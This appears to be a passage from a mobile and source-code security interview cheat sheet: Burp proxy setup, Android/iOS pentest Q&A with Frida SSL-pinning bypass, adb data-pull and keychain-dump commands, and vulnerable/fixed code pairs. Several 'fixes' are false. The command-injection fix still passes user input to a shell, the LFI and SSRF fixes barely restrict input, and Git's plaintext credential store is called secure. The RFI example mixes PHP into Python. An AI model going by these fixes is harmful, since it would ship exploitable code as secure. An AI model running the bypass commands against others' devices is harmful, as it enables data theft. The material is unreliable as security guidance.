| **Method 1: Burp Suite**          | **Android**           | 1. Open Burp Suite and start the proxy listener (default: `127.0.0.1:8080`).<br>2. Find the IP address of the machine running Burp Suite using `ipconfig` or `ifconfig`.<br>3. On Android, open **Wi-Fi** settings, long press the connected network, select **Modify Network**, set Proxy to **Manual**, and enter the IP address and port (default: `8080`).<br>4. Verify by checking Burp Suite’s **Proxy** tab for intercepted traffic. | Configure Android device to use Burp Suite as a proxy. |
|                                   | **iOS**               | 1. Open Burp Suite and start the proxy listener (default: `127.0.0.1:8080`).<br>2. Find the IP address of the machine running Burp Suite using `ipconfig` or `ifconfig`.<br>3. On iOS, open **Settings**, go to **Wi-Fi**, select the network, scroll to **HTTP Proxy**, select **Manual**, and enter the IP address and port (default: `8080`).<br>4. Verify by checking Burp Suite’s **Proxy** tab for intercepted traffic. | Configure iOS device to use Burp Suite as a proxy. |
| **Method 2: ADB**                 | **Android**           | **Configure:** `adb shell settings put global http_proxy <ip>:<port>`<br>**Remove:** `adb shell settings put global http_proxy :0` | Use ADB commands to configure or remove proxy settings on an Android device. |
| **Method 3: Android Studio Emulator** | **Android**       | 1. Open Android Studio.<br>2. Go to **AVD Manager**.<br>3. Click the **Edit** (pencil) icon next to the emulator.<br>4. In the **Emulated Performance** section, click **Show Advanced Settings**.<br>5. Scroll down to the **Proxy** section.<br>6. Select **Manual proxy configuration**.<br>7. Enter the IP address and port of Burp Suite (default: `8080`).<br>8. Click **Finish** and restart the emulator if needed.<br>9. Verify by checking Burp Suite’s **Proxy** tab for intercepted traffic. | Configure the Android emulator in Android Studio to use Burp Suite as a proxy. |
| **Method 4: Genymotion**          | **Android**           | 1. Open Genymotion.<br>2. Go to **Settings**.<br>3. Navigate to **Proxy**.<br>4. Select **Manual proxy configuration**.<br>5. Enter the IP address and port of Burp Suite (default: `8080`).<br>6. Click **Apply** and restart the emulator if needed.<br>7. Verify by checking Burp Suite’s **Proxy** tab for intercepted traffic. | Configure the Genymotion emulator to use Burp Suite as a proxy. |
| **Method 5: NoxPlayer**           | **Android**           | 1. Open NoxPlayer.<br>2. Go to **Settings**.<br>3. Navigate to **Proxy Settings**.<br>4. Select **Manual Proxy Configuration**.<br>5. Enter the IP address and port of Burp Suite (default: `8080`).<br>6. Click **Save** and restart the emulator if needed.<br>7. Verify by checking Burp Suite’s **Proxy** tab for intercepted traffic. | Configure NoxPlayer emulator to use Burp Suite as a proxy. |



### Android Penetration Testing Interview Questions

| **Question**                                                                                                 | **Description**                                                                                                  | **Command/Payload**                                                                                      |
|-------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------|
| What is ADB and how is it used in Android penetration testing?                                             | ADB (Android Debug Bridge) is a command-line tool that enables communication with an Android device or emulator. It is used for tasks such as installing and debugging apps, accessing the file system, and running commands. | `adb shell` <br> `adb install <app.apk>` <br> `adb pull /data/data/com.example.app/shared_prefs/` |
| How do you perform static analysis on an Android application?                                                | Static analysis involves decompiling the APK using tools like JADX or Apktool to examine the app’s code and resources. This helps identify vulnerabilities such as insecure data storage, improper permissions, and hardcoded secrets. | `jadx-gui <app.apk>` <br> `apktool d <app.apk>` |
| What is SSL pinning and how can it be bypassed in Android applications?                                     | SSL pinning is a security measure that ensures an app only accepts certificates from specific servers. Bypass techniques include using tools like Frida or Objection to intercept and modify SSL/TLS methods or modifying the app to bypass pinning checks. | `frida -U -p <pid> -l bypass_ssl_pinning.js` <br> `objection --gadget <app> explore` |
| What are the main components of an Android application?                                                     | The main components are Activities, Services, Broadcast Receivers, and Content Providers. These components define the app’s structure and functionality.                                        | N/A                                                                                                       |
| What is an APK file?                                                                                          | An APK (Android Package Kit) is the file format used for distributing and installing Android applications.                                                   | N/A                                                                                                       |
| What is the AndroidManifest.xml file and what information does it contain?                                  | The AndroidManifest.xml file is a configuration file that declares the app’s components, permissions, and other settings. It is essential for defining the app's behavior and security.    | `apktool d <app.apk>` <br> `cat <app>/AndroidManifest.xml` |
| How do you enumerate an Android application for vulnerabilities?                                             | Enumeration involves gathering information about the app’s components, permissions, exposed services, and potential attack vectors using tools and techniques like static and dynamic analysis, network monitoring, and reverse engineering. | `drozer console connect` <br> `drozer runmodule exploits.missingapp` |
| How do you bypass SSL pinning in a Flutter application?                                                       | To bypass SSL pinning in a Flutter app, you can use Frida or Objection to hook into network security methods, or modify the app’s code to disable SSL pinning mechanisms. | `frida -U -p <pid> -l bypass_ssl_pinning_flutter.js` <br> `objection --gadget <app> explore` |
| What are common static vulnerabilities found during static analysis of Android applications?                | Common vulnerabilities include hardcoded secrets (API keys, passwords), insecure data storage (in plaintext), improper permissions (overly broad permissions in AndroidManifest.xml), and insecure communication (unencrypted or weakly encrypted data). | `grep -r 'password' .` <br> `grep -r 'api_key' .` |
| What are some tools used for Android penetration testing?                                                     | Common tools include JADX (for decompiling APKs), Apktool (for reverse engineering), Burp Suite (for intercepting HTTP/S traffic), Frida (for dynamic analysis and hooking), and Drozer (for vulnerability scanning). | `jadx-gui <app.apk>` <br> `apktool d <app.apk>` <br> `burpsuite` <br> `frida-server` <br> `drozer console connect` |
| What is root and how can it be bypassed in Android applications?                                            | Root access provides elevated permissions on an Android device. Bypassing root protections may involve exploiting vulnerabilities, using custom firmware, or leveraging tools like Magisk for systemless root. | `adb root` <br> `adb shell su` <br> `magisk` |
| What is Intent Spoofing and how can it be exploited?                                                         | Intent Spoofing involves sending unauthorized intents to components of an Android app. Exploits can lead to unauthorized actions or data access. | `adb shell am broadcast -a com.example.broadcast.MY_NOTIFICATION --ez "extra" true` |
| What is Insecure Data Storage and how can it be detected?                                                     | Insecure Data Storage involves storing sensitive data in unprotected locations, such as plaintext files or shared preferences. Detection involves examining where data is stored and assessing its protection. | `adb pull /data/data/com.example.app/shared_prefs/` <br> `adb shell cat /data/data/com.example.app/files/secret.txt` |
| What is WebView Vulnerability and how can it be exploited?                                                    | WebView vulnerabilities occur when an app uses WebView to load untrusted content. Exploits can involve JavaScript injection or accessing sensitive app data. | `javascript:alert('XSS')` <br> `adb shell dumpsys webview` |

## iOS Penetration Testing Interview Questions

| **Question**                                                                                                 | **Description**                                                                                                  | **Command/Payload**                                                                                      |
|-------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------|
| What is an IPA file and how is it used in iOS penetration testing?                                          | An IPA (iOS App Store Package) file is the format used for distributing and installing iOS applications. In penetration testing, you analyze IPA files by decompiling them with tools like class-dump or Hopper to examine their structure and code for vulnerabilities. | `class-dump <app.ipa>` <br> `dumpdecrypted <app.ipa>` |
| What is the Info.plist file and what information does it contain?                                           | The Info.plist file contains metadata about the app, including permissions, supported architectures, and configuration settings. It is essential for understanding the app’s capabilities and security requirements.                                        | `strings <app.ipa> | grep 'Info.plist'` |
| How do you perform static analysis on an iOS application?                                                    | Static analysis involves decompiling the IPA file using tools like Hopper or IDA Pro to analyze the app's binary code. This helps identify vulnerabilities such as insecure data storage, improper permissions, and code-level issues.                | `class-dump <app.ipa>` <br> `hopper <app.ipa>` |
| What is SSL pinning and how can it be bypassed in iOS applications?                                         | SSL pinning ensures the app only trusts specific certificates. Bypass techniques include using tools like Frida or Cycript to hook into SSL/TLS methods or modifying the app's code to disable pinning checks, allowing for traffic interception and analysis. | `frida -U -p <pid> -l bypass_ssl_pinning.js` <br> `cycript -p <app>` |
| What methods are used for reverse engineering an iOS application?                                            | Methods include decompiling the IPA file, analyzing the binary with disassemblers like Ghidra or IDA Pro, and examining the app’s runtime behavior using tools like Cycript or Frida.                             | `class-dump <app.ipa>` <br> `ghidra` <br> `ida <app.ipa>` |
| What are entitlements in an iOS application?                                                                  | Entitlements are special permissions granted to an app to access certain system resources or services, such as Keychain access or iCloud. They control what the app can do and access on the device.                                              | `security dump-keychain -d` <br> `strings <app.ipa> | grep 'entitlements'` |
| How do you enumerate an iOS application for vulnerabilities?                                                 | Enumeration involves analyzing the app’s structure, permissions, exposed APIs, and network communication using static and dynamic analysis techniques. Tools include class-dump, Hopper, and network analyzers. | `class-dump <app.ipa>` <br> `networksetup -listallhardwareports` |
| What are common static vulnerabilities found during static analysis of iOS applications?                    | Common vulnerabilities include hardcoded secrets (API keys, passwords), insecure data storage (in plaintext), improper permissions (overly broad entitlements), and insecure communication (unencrypted or weakly encrypted data). | `grep -r 'password' .` <br> `grep -r 'api_key' .` |
| What are some tools used for iOS penetration testing?                                                         | Common tools include class-dump (for extracting class information), Hopper (for disassembling binaries), Frida (for dynamic analysis and hooking), Cycript (for runtime analysis), and Burp Suite (for intercepting HTTP/S traffic). | `class-dump <app.ipa>` <br> `hopper <app.ipa>` <br> `frida-server` <br> `cycript` <br> `burpsuite` |
| What is jailbreak and how can it be bypassed in iOS applications?                                          | Jailbreaking provides elevated access to iOS devices. Bypassing jailbreak protections may involve using tools like Cydia or uncovering exploits that bypass restrictions. For testing, jailbroken devices can be used to access restricted areas or functions. | `Cydia` <br> `unc0ver` <br> `checkra1n` |
| What is Code Injection and how can it be exploited in iOS apps?                                             | Code Injection involves inserting malicious code into an application to alter its behavior. Exploits can include modifying app binaries or injecting code at runtime using tools like Frida. | `frida -U -p <pid> -l code_injection.js` |
| What is insecure direct object reference (IDOR) and how can it be exploited in iOS apps?                   | IDOR occurs when an app exposes internal objects (e.g., files or database entries) directly to users without proper authorization checks. Exploits can involve accessing or manipulating these objects via predictable URLs or parameters. | `curl -X GET 'https://api.example.com/data/123'` |











---
---
# Source Code Analysis
---

## Static Application Security Testing (SAST) Interview Questions

| **Question**                                                                                              | **Description**                                                                                              |
|----------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------|
| What is SAST and how is it used in security testing?                                                    | Static Application Security Testing (SAST) is a method of analyzing source code or binaries to identify security vulnerabilities without executing the code. It helps find issues like code injection, insecure data storage, and more. |
| What are common SAST tools and what are their primary functions?                                        | Common SAST tools include both open-source and paid options. Paid tools like Checkmarx (vulnerability scanning), Fortify (comprehensive static analysis), and Veracode (code quality and security) are widely used. Open-source tools such as Semgrep (pattern-based static analysis), SonarQube (code quality and security), and Snyk (dependency scanning) are also popular. |
| List the few Free and paid tools      | **Commercial/Paid Tools:** <br> - **Checkmarx**: Comprehensive vulnerability scanning. <br> - **Fortify**: Provides in-depth static and dynamic analysis. <br> - **Veracode**: Delivers static and dynamic analysis for security vulnerabilities. <br> **Open Source/Free Tools:** <br> - **Semgrep**: Performs pattern-based static analysis. <br> - **SonarQube**: Provides code quality and security analysis. <br> - **Snyk**: Focuses on dependency scanning and vulnerability management. |



### Vulnerable Code and Fixed Code Examples

| **Vulnerable Code**                                                                                                                                                                  | **Fixed Code**                                                                                                                                                                                 | **Explanation**                                                                                                                                          |
|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------|
| **SQL Injection (SQLi)**<br>```python<br>import sqlite3<br><br>def get_user(username):<br>    conn = sqlite3.connect('database.db')<br>    cursor = conn.cursor()<br>    cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")  # Vulnerable<br>    return cursor.fetchone()<br>``` | ```python<br>import sqlite3<br><br>def get_user(username):<br>    conn = sqlite3.connect('database.db')<br>    cursor = conn.cursor()<br>    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))  # Fixed<br>    return cursor.fetchone()<br>``` | **Explanation:** Parameterized queries (`?` placeholder) are used with SQLite to prevent SQL injection. They safely separate SQL commands from data inputs. |
| **Server-Side Request Forgery (SSRF)**<br>```python<br>import requests<br><br>def fetch_url(url):<br>    response = requests.get(url)  # Vulnerable<br>    return response.text<br>``` | ```python<br>import requests<br><br>def fetch_url(url):<br>    if not url.startswith(('http://', 'https://')):<br>        raise ValueError('Invalid URL')<br>    response = requests.get(url)<br>    return response.text<br>``` | URL validation ensures the URL starts with `http://` or `https://`, reducing the risk of SSRF by preventing unauthorized internal requests. |
| **Cross-Site Scripting (XSS)**<br>```python<br>from flask import Flask, request, render_template_string, escape<br><br>app = Flask(__name__)<br><br>@app.route('/')<br>def index():<br>    name = request.args.get('name', 'Guest')<br>    return render_template_string('<h1>Hello, {{ name }}</h1>', name=name)  # Vulnerable<br>``` | ```python<br>from flask import Flask, request, render_template_string, escape<br><br>app = Flask(__name__)<br><br>@app.route('/')<br>def index():<br>    name = request.args.get('name', 'Guest')<br>    return render_template_string('<h1>Hello, {{ name | safe }}</h1>', name=escape(name))  # Fixed<br>``` |  Using the `escape` function from Flask to escape user input and the `safe` filter in templates prevents XSS by neutralizing potentially harmful content. |
| **Cross-Site Request Forgery (CSRF)**<br>```html<br>&lt;form action="/transfer" method="post"&gt;<br>    &lt;input type="hidden" name="csrf_token" value="{{ csrf_token }}"&gt;<br>    &lt;input type="hidden" name="amount" value="1000"&gt;<br>    &lt;input type="submit" value="Transfer Money"&gt;<br>&lt;/form&gt;<br>``` | CSRF tokens (`csrf_token`) are included in forms to ensure that requests are made by authenticated users, preventing unauthorized actions from external sites. |
| **OS Command Injection**<br>```python<br>import subprocess<br><br>def execute_command(command):<br>    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)  # Vulnerable<br>    return result.decode("utf-8")<br>``` | ```python<br>import subprocess<br><br>def execute_command(command):<br>    try:<br>        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)<br>        return result.decode("utf-8")<br>    except subprocess.CalledProcessError as e:<br>        return f"Error: {e}"<br>``` | Using `subprocess` with exception handling prevents command injection. The code safely captures output and errors, avoiding unintended command execution. |
| **Local File Inclusion (LFI)**<br>```python<br>import os<br><br>def read_file(file_path):<br>    with open(file_path, 'r') as file:<br>        content = file.read()<br>    return content<br>``` | ```python<br>import os<br><br>def read_file(file_path):<br>    if not os.path.isfile(file_path):<br>        return "File not found"<br>    with open(file_path, 'r') as file:<br>        content = file.read()<br>    return content<br>``` |  Checking if the file exists using `os.path.isfile` before opening it prevents unauthorized file access and reduces the risk of including unintended files. |
| **Remote File Inclusion (RFI)**<br>```python<br>import requests<br><br>def fetch_remote_file(url):<br>    if not filter_var(url, FILTER_VALIDATE_URL):<br>        raise Exception('Invalid URL')<br>    return requests.get(url).text<br>``` | ```python<br>import requests<br><br>def fetch_remote_file(url):<br>    if not url.startswith(('http://', 'https://')):<br>        return "Invalid URL"<br>    response = requests.get(url)<br>    if response.status_code != 200:<br>        return "Failed to fetch remote file"<br>    return response.text<br>``` | URL validation (`url.startswith`) and checking HTTP status codes ensure that only valid and accessible URLs are processed, mitigating risks from remote file inclusion. |
| **Docker Image Vulnerability**<br>```dockerfile<br># Vulnerable Dockerfile<br>FROM ubuntu:latest<br>RUN apt-get update && apt-get install -y vulnerable-package<br>``` | ```dockerfile<br># Fixed Dockerfile<br>FROM ubuntu:latest<br>RUN apt-get update && apt-get install -y secure-package<br>``` | Replacing vulnerable packages with their secure versions reduces known security risks in Docker images. Regular updates and security patches are crucial. |
| **Kubernetes Secrets Exposure**<br>```yaml<br># Vulnerable Kubernetes Deployment<br>apiVersion: apps/v1<br>kind: Deployment<br>metadata:<br>  name: myapp<br>spec:<br>  template:<br>    spec:<br>      containers:<br>        - name: myapp<br>          image: myapp:latest<br>          env:<br>            - name: SECRET_KEY<br>              value: "mysecretkey"<br>``` | ```yaml<br># Fixed Kubernetes Deployment<br>apiVersion: apps/v1<br>kind: Deployment<br>metadata:<br>  name: myapp<br>spec:<br>  template:<br>    spec:<br>      containers:<br>        - name: myapp<br>          image: myapp:latest<br>          env:<br>            - name: SECRET_KEY<br>              valueFrom:<br>                secretKeyRef:<br>                  name: myapp-secrets<br>                  key: secret_key<br>``` |  Using Kubernetes Secrets (`valueFrom: secretKeyRef`) instead of plaintext values in deployment configurations enhances security by managing sensitive data securely. |
| **Jenkins Credentials Exposure**<br>```groovy<br>// Vulnerable Jenkins Pipeline<br>node {<br>  stage('Build') {<br>    sh 'some_command --key=mysecretkey'<br>  }<br>}<br>``` | ```groovy<br>// Fixed Jenkins Pipeline<br>node {<br>  stage('Build') {<br>    withCredentials([string(credentialsId: 'mysecretkey-id', variable: 'SECRET_KEY')]) {<br>      sh 'some_command --key=$SECRET_KEY'<br>    }<br>  }<br>}<br>``` |  Jenkins' `withCredentials` block securely handles sensitive information by using credentials stored in Jenkins' credentials management system, preventing exposure in scripts. |
| **Git Credential Exposure**<br>```bash<br># Vulnerable Git config<br>git config --global user.name "username"<br>git config --global user.password "password"<br>``` | ```bash<br># Fixed Git config<br># Store credentials securely using Git credential helper<br>git config --global credential.helper store<br>``` |  Configuring Git to use a credential helper (`credential.helper store`) securely manages credentials, avoiding plaintext storage and enhancing security. |


### > Vulnerable code Challenge:

## SQL Injection (SQLi)
- Vulnerable Code: Direct concatenation of user input into SQL query.
- Fix: Use parameterized queries to separate data from commands.

```python
import sqlite3

def get_user(username):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")  # Vulnerable
    return cursor.fetchone() 
```

 - **Fixed Code**
```python
def get_user(username):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))  # Fixed
    return cursor.fetchone() 
```

## Server-Side Request Forgery (SSRF)
- Vulnerable Code: Direct use of user-controlled input in HTTP requests.
- Fix: Validate and restrict user-supplied URLs to prevent SSRF.
```python
import requests

def fetch_url(url):
    response = requests.get(url)  # Vulnerable
    return response.text
```

 -  **Fixed Code**
```python
def fetch_url(url):
    if not url.startswith('http://') and not url.startswith('https://'):
        raise ValueError('Invalid URL')
    response = requests.get(url)
    return response.text
```

## Cross-Site Scripting (XSS)
- Vulnerable Code: Rendering user input without proper escaping.
- Fix: Use escaping functions to prevent injection of malicious scripts.

```python
from flask import Flask, request, render_template_string, escape

app = Flask(__name__)

@app.route('/')
def index():
    name = request.args.get('name', 'Guest')
    return render_template_string('<h1>Hello, {{ name }}</h1>', name=name)  # Vulnerable
```

- **Fixed Code**

```python
 @app.route('/')
 def index():
    name = request.args.get('name', 'Guest')
    return render_template_string('<h1>Hello, {{ name | safe }}</h1>', name=escape(name))  # Fixed
```


## Cross-Site Request Forgery (CSRF)
- Vulnerable Code: Lack of CSRF token protection in forms.
- Fix: Include CSRF tokens in forms and AJAX requests.

```python
<form action="/transfer" method="post">
    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
    <input type="hidden" name="amount" value="1000">
    <input type="submit" value="Transfer Money">
</form>
```

## OS Command Injection
- Vulnerable Code: Direct use of user input in system commands without validation.
- Fix: Use subprocess module with proper input validation and sanitization.
```python
import subprocess

def execute_command(command):
    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)  # Vulnerable
    return result.decode("utf-8")
```

 - **Fixed Code**
```py
def execute_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode("utf-8")
    except subprocess.CalledProcessError as e:
        return f"Error: {e}"
```

## Local File Inclusion (LFI)
- Vulnerable Code: Directly opens a file without proper validation.
- Fix: Check if the file exists before reading its content.
```python
def read_file(file_path):
    with open(file_path, 'r') as file:
        content = file.read()
    return content
```
 - **Fixed Code**
```py
def read_file_fixed(file_path):
    if not os.path.isfile(file_path):
        return "File not found"
    with open(file_path, 'r') as file:
        content = file.read()
    return content
```

## Remote File Inclusion (RFI)
- Vulnerable Code: Makes an HTTP request to a user-supplied URL without proper validation.
- Fix: Check if the URL starts with 'http://' or 'https://' and handle HTTP errors properly.
```python
def fetch_remote_file(url):
    if not filter_var($url, FILTER_VALIDATE_URL):
        throw new Exception('Invalid URL')
    return file_get_contents($url)
```
  - **Fixed Code**
```py
def fetch_remote_file(url):
    if not url.startswith(('http://', 'https://')):
        return "Invalid URL"
    response = requests.get(url)
    if response.status_code != 200:
        return "Failed to fetch remote file"
    return response.text

```
